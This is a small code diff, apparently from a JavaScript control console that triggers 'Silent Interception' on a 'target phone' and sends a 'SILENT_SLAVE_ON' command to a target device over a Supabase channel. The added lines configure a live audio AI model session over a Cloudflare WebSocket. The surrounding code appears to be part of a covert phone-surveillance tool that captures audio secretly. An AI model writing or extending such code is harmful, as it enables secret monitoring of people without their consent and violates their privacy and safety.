@@ -3312,6 +3312,18 @@
                 logOp("🔗 Local browser WebSocket paired successfully.", "status");
                 logOp("Triggering Silent Interception command on target phone...", "status");
                 
+                // Send the setup configuration frame to Cloudflare
+                const setupMessage = {
+                    "setup": {
+                        "model": "models/gemini-3.1-flash-live-preview",
+                        "generationConfig": {
+                            "responseModalities": ["AUDIO"]
+                        }
+                    }
+                };
+                opWs.send(JSON.stringify(setupMessage));
+                console.log("[OP_WS_DIAG] Sent session setup configuration frame to Cloudflare.");
+
                 // Send the Master-Slave control packet over the bound Supabase channel
                 console.log("[OP_WS_DIAG] Sending SILENT_SLAVE_ON broadcast via Supabase for device:", targetId);
                 opChannel.send({
